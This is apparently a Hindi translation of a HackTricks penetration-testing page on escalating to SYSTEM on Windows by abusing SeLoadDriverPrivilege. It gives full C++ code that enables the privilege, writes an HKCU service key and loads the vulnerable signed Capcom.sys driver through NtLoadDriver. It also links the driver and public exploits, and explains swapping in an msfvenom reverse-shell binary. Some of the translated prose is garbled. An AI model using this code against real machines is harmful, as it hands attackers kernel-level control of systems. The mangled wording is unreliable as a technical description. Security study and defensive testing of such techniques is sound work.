# विनामूल्य उन्नति का दुरुपयोग करें

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की इच्छा है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **ट्विटर** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें, [hacktricks रेपो](https://github.com/carlospolop/hacktricks) और [hacktricks-cloud रेपो](https://github.com/carlospolop/hacktricks-cloud) में पीआर जमा करके।**

</details>

## SeLoadDriverPrivilege <a href="#seloaddriverprivilege" id="seloaddriverprivilege"></a>

किसी भी उपयोगकर्ता को सौंदर्य देने के लिए एक बहुत खतरनाक विशेषाधिकार - इसे उपयोगकर्ता को कर्नल ड्राइवर्स लोड करने और कर्नल विशेषाधिकारों के साथ कोड निष्पादित करने की अनुमति देता है, जिसे `NT\System` कहा जाता है। देखें कि `offense\spotless` उपयोगकर्ता के पास यह विशेषाधिकार है:

![](../../../.gitbook/assets/a8.png)

`Whoami /priv` दिखाता है कि यह विशेषाधिकार डिफ़ॉल्ट रूप से अक्षम है:

![](../../../.gitbook/assets/a9.png)

हालांकि, नीचे दिए गए कोड द्वारा इस विशेषाधिकार को सक्षम करना बहुत आसान है:

{% code title="privileges.cpp" %}
```c
#include "stdafx.h"
#include <windows.h>
#include <stdio.h>

int main()
{
TOKEN_PRIVILEGES tp;
LUID luid;
bool bEnablePrivilege(true);
HANDLE hToken(NULL);
OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);

if (!LookupPrivilegeValue(
NULL,            // lookup privilege on local system
L"SeLoadDriverPrivilege",   // privilege to lookup
&luid))        // receives LUID of privilege
{
printf("LookupPrivilegeValue error: %un", GetLastError());
return FALSE;
}
tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;

if (bEnablePrivilege) {
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
}

// Enable the privilege or disable all privileges.
if (!AdjustTokenPrivileges(
hToken,
FALSE,
&tp,
sizeof(TOKEN_PRIVILEGES),
(PTOKEN_PRIVILEGES)NULL,
(PDWORD)NULL))
{
printf("AdjustTokenPrivileges error: %x", GetLastError());
return FALSE;
}

system("cmd");
return 0;
}
```
{% endcode %}

हम ऊपर दिए गए कोंपाइल करते हैं, और निम्नलिखित विशेषाधिकार `SeLoadDriverPrivilege` अब सक्षम है:

![](../../../.gitbook/assets/a10.png)

### Capcom.sys ड्राइवर अभिकरण <a href="#capcom-sys-driver-exploit" id="capcom-sys-driver-exploit"></a>

`SeLoadDriverPrivilege` को और अधिक खतरनाक साबित करने के लिए, आइए इसे **विशेषाधिकार को उच्च करने** के लिए उपयोग करें।

आप **NTLoadDriver** का उपयोग करके एक नया ड्राइवर लोड कर सकते हैं:
```cpp
NTSTATUS NTLoadDriver(
_In_ PUNICODE_STRING DriverServiceName
);
```
डिफ़ॉल्ट रूप से ड्राइवर सेवा नाम `\Registry\Machine\System\CurrentControlSet\Services\` के तहत होना चाहिए।

लेकिन, **दस्तावेज़ीकरण** के अनुसार आप **HKEY\_CURRENT\_USER** के तहत पथ भी उपयोग कर सकते हैं, इसलिए आप उस सिस्टम पर विभिन्न ड्राइवर्स लोड करने के लिए वहां एक रजिस्ट्री में परिवर्तन कर सकते हैं।
नई रजिस्ट्री में परिभाषित होने वाले प्रमुख पैरामीटर हैं:

* **ImagePath:** REG\_EXPAND\_SZ प्रकार का मान जो ड्राइवर पथ को निर्दिष्ट करता है। इस संदर्भ में, पथ एक ऐसा निर्देशिका होनी चाहिए जिसमें गैर-विशेषाधिकारी उपयोगकर्ता के द्वारा संशोधन अनुमतियाँ हों।
* **Type:** REG\_WORD प्रकार का मान जिसमें सेवा का प्रकार निर्दिष्ट होता है। हमारे उद्देश्य के लिए, मान को SERVICE\_KERNEL\_DRIVER (0x00000001) के रूप में परिभाषित किया जाना चाहिए।

इसलिए आप एक नई रजिस्ट्री बना सकते हैं **`\Registry\User\<User-SID>\System\CurrentControlSet\MyService`** में, जहां **ImagePath** में ड्राइवर के पथ को और **Type** में मान 1 को निर्दिष्ट करें और उसे उत्पादन में उपयोग करें (आप उपयोगकर्ता SID प्राप्त करने के लिए इस्तेमाल कर सकते हैं: `Get-ADUser -Identity 'USERNAME' | select SID` या `(New-Object System.Security.Principal.NTAccount("USERNAME")).Translate([System.Security.Principal.SecurityIdentifier]).value`।
```bash
PCWSTR pPathSource = L"C:\\experiments\\privileges\\Capcom.sys";
PCWSTR pPathSourceReg = L"\\Registry\\User\\<User-SID>\\System\\CurrentControlSet\\MyService";
```
पहला उदाहरण एक स्ट्रिंग चर की घोषणा करता है जो विक्टिम सिस्टम पर कमजोर **Capcom.sys** ड्राइवर के स्थान को दर्शाता है और दूसरा एक स्ट्रिंग चर है जो एक सेवा नाम दर्शाता है जिसे उपयोग किया जाएगा (कोई भी सेवा हो सकती है)।
ध्यान दें, **ड्राइवर को Windows द्वारा साइन किया जाना चाहिए** ताकि आप अनियमित ड्राइवर्स लोड नहीं कर सकते। लेकिन, **Capcom.sys** **को दुरुपयोग करने के लिए अनियमित कोड को निष्पादित करने के लिए इसे लोड किया जा सकता है और यह Windows द्वारा साइन किया गया है**, इसलिए लक्ष्य है कि इस ड्राइवर को लोड करें और इसे शोषण करें।

ड्राइवर लोड करें:
```c
#include "stdafx.h"
#include <windows.h>
#include <stdio.h>
#include <ntsecapi.h>
#include <stdlib.h>
#include <locale.h>
#include <iostream>
#include "stdafx.h"

NTSTATUS(NTAPI *NtLoadDriver)(IN PUNICODE_STRING DriverServiceName);
VOID(NTAPI *RtlInitUnicodeString)(PUNICODE_STRING DestinationString, PCWSTR SourceString);
NTSTATUS(NTAPI *NtUnloadDriver)(IN PUNICODE_STRING DriverServiceName);

int main()
{
TOKEN_PRIVILEGES tp;
LUID luid;
bool bEnablePrivilege(true);
HANDLE hToken(NULL);
OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);

if (!LookupPrivilegeValue(
NULL,            // lookup privilege on local system
L"SeLoadDriverPrivilege",   // privilege to lookup
&luid))        // receives LUID of privilege
{
printf("LookupPrivilegeValue error: %un", GetLastError());
return FALSE;
}
tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;

if (bEnablePrivilege) {
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
}

// Enable the privilege or disable all privileges.
if (!AdjustTokenPrivileges(
hToken,
FALSE,
&tp,
sizeof(TOKEN_PRIVILEGES),
(PTOKEN_PRIVILEGES)NULL,
(PDWORD)NULL))
{
printf("AdjustTokenPrivileges error: %x", GetLastError());
return FALSE;
}

//system("cmd");
// below code for loading drivers is taken from https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/RDI/dll/NtLoadDriver.h
std::cout << "[+] Set Registry Keys" << std::endl;
NTSTATUS st1;
UNICODE_STRING pPath;
UNICODE_STRING pPathReg;
PCWSTR pPathSource = L"C:\\experiments\\privileges\\Capcom.sys";
PCWSTR pPathSourceReg = L"\\Registry\\User\\<User-SID>\\System\\CurrentControlSet\\MyService";
const char NTDLL[] = { 0x6e, 0x74, 0x64, 0x6c, 0x6c, 0x2e, 0x64, 0x6c, 0x6c, 0x00 };
HMODULE hObsolete = GetModuleHandleA(NTDLL);
*(FARPROC *)&RtlInitUnicodeString = GetProcAddress(hObsolete, "RtlInitUnicodeString");
*(FARPROC *)&NtLoadDriver = GetProcAddress(hObsolete, "NtLoadDriver");
*(FARPROC *)&NtUnloadDriver = GetProcAddress(hObsolete, "NtUnloadDriver");

RtlInitUnicodeString(&pPath, pPathSource);
RtlInitUnicodeString(&pPathReg, pPathSourceReg);
st1 = NtLoadDriver(&pPathReg);
std::cout << "[+] value of st1: " << st1 << "\n";
if (st1 == ERROR_SUCCESS) {
std::cout << "[+] Driver Loaded as Kernel..\n";
std::cout << "[+] Press [ENTER] to unload driver\n";
}

getchar();
st1 = NtUnloadDriver(&pPathReg);
if (st1 == ERROR_SUCCESS) {
std::cout << "[+] Driver unloaded from Kernel..\n";
std::cout << "[+] Press [ENTER] to exit\n";
getchar();
}

return 0;
}
```
ऊपर कोड को कंपाइल और निष्पादित करने के बाद, हम देख सकते हैं कि हमारे दुष्ट `Capcom.sys` ड्राइवर विक्टिम सिस्टम पर लोड हो जाता है:

![](../../../.gitbook/assets/a11.png)

डाउनलोड: [Capcom.sys - 10KB](https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LTyWsUdKa48PyMRyZ4I%2F-LTyZ9IkoofuWRxlNpUG%2FCapcom.sys?alt=media\&token=e4417fb3-f2fd-42ef-9000-d410bc6ceb54)

**अब इसे उपयोग करके लोड किए गए ड्राइवर का दुरुपयोग करने का समय है ताकि विचारहीन कोड को निष्पादित किया जा सके।**

आप [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom) और [https://github.com/zerosum0x0/puppetstrings](https://github.com/zerosum0x0/puppetstrings) से उत्पन्न कोड डाउनलोड कर सकते हैं और इसे सिस्टम पर निष्पादित करके हमारी विशेषाधिकारों को `NT Authority\System` तक उन्नत कर सकते हैं:

![](../../../.gitbook/assets/a12.png)

### कोई GUI नहीं

यदि हमें लक्षित को GUI उपयोग करने की सुविधा नहीं है, तो हमें कंपाइल करने से पहले **`ExploitCapcom.cpp`** कोड को संशोधित करना होगा। यहां हम पंक्ति 292 को संपादित कर सकते हैं और `C:\\Windows\\system32\\cmd.exe"` को, उदाहरण के लिए, `msfvenom` के साथ बनाए गए एक रिवर्स शेल बाइनरी के साथ बदल सकते हैं, जैसे `c:\ProgramData\revshell.exe`।

कोड: c
```c
// Launches a command shell process
static bool LaunchShell()
{
TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
PROCESS_INFORMATION ProcessInfo;
STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
&ProcessInfo))
{
return false;
}

CloseHandle(ProcessInfo.hThread);
CloseHandle(ProcessInfo.hProcess);
return true;
}
```
`CommandLine` स्ट्रिंग इस उदाहरण में बदल जाएगी:

कोड: c
```c
TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
```
हम `msfvenom` पेलोड पर आधारित एक लिस्टनर सेट अप करेंगे और उम्मीद है कि हम `ExploitCapcom.exe` को निष्पादित करते समय एक रिवर्स शेल कनेक्शन प्राप्त करेंगे। यदि किसी कारण से रिवर्स शेल कनेक्शन ब्लॉक हो जाता है, तो हम एक बाइंड शेल या एक्सेक/यूजर पेलोड का प्रयास कर सकते हैं।

### स्वचालित

आप [https://github.com/TarlogicSecurity/EoPLoadDriver/](https://github.com/TarlogicSecurity/EoPLoadDriver/) का उपयोग करके **स्वचालित रूप से** **अधिकार** को **सक्षम कर सकते हैं**, HKEY\_CURRENT\_USER के तहत **रजिस्ट्री कुंजी** बना सकते हैं और रजिस्ट्री कुंजी को बनाने के लिए और ड्राइवर के पथ को निर्दिष्ट करने के लिए NTLoadDriver को निष्पादित कर सकते हैं:

![](<../../../.gitbook/assets/image (289).png>)

फिर, आपको एक **Capcom.sys** एक्सप्लॉइट डाउनलोड करने की आवश्यकता होगी और इसका उपयोग अधिकारों को उन्नत करने के लिए करना होगा।

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप चाहते हैं कि आपकी **कंपनी HackTricks में विज्ञापित** हो? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने की सुविधा** चाहिए? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष [**NFT**](https://opensea.io/collection/the-peass-family) संग्रह।
* प्राप्त करें [**आधिकारिक PEASS और HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)** का पालन करें।**
* **अपने हैकिंग ट्रिक्स साझा करें, [hacktricks रेपो](https://github.com/carlospolop/hacktricks) और [hacktricks-cloud रेपो](https://github.com/carlospolop/hacktricks-cloud) में पीआर जमा करके**।

</details>
